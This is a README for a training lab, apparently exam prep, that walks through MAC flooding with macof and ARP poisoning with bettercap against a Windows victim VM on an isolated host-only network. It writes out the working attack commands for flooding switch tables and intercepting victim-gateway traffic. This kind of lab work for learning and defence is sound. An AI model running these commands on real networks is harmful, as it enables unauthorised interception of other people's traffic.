# Datalink-Layer-Attacks-LAB
Cybersecurity attacks LABs (eCIR Prep)
# 🧠 Network Attacks Lab – MAC Flooding & ARP Poisoning (Kali Linux)

## 📌 Lab Overview

This repository contains two mini labs:

1. **MAC Flooding Attack** using `macof` to overflow switch CAM tables.
2. **ARP Poisoning Attack** using `bettercap` to intercept traffic between victim and gateway.

---

## 🛠️ Tools Used

- Kali Linux (Attacker)
- Windows 10 (Victim)
- macof (dsniff)
- bettercap
- Wireshark
- VMware Workstation (Dual NIC Setup - NAT + Host-Only)

---

## 🧪 Lab 1: MAC Flooding

### 🔧 Topology

```
[ Kali Linux ] -- Host-Only Network -- [ Windows Victim ]
```

### 🚀 Steps

1. Configure both VMs with:
   - Adapter 1: NAT
   - Adapter 2: Host-Only

2. Run MAC flooding from Kali:
   ```bash
   sudo macof -i eth1
   ```

3. Capture traffic in Wireshark using:
   ```wireshark
   !(eth.src == YOUR_MAC || eth.dst == YOUR_MAC)
   ```

4. Success when packets not destined for attacker are visible.

---

## 🧪 Lab 2: ARP Poisoning

### 🔧 Topology

```
[ Kali Linux ] -- Host-Only Network -- [ Windows Victim ] -- Gateway
```

### 🚀 Steps

1. Identify victim and gateway IPs:
   ```bash
   net.probe on
   net.show
   ```

2. Set target in bettercap:
   ```bash
   set arp.spoof.targets [victim_ip]
   arp.spoof on
   net.sniff on
   ```

3. Success when sniffed traffic includes victim-gateway communication.

---


---

## 📬 Author

**Adham Hani**  
Security Enthusiast | SOC Trainee | DFIR Student

---

## 🔒 Disclaimer

> These labs are for **educational purposes only**. Do not perform attacks on unauthorized networks.
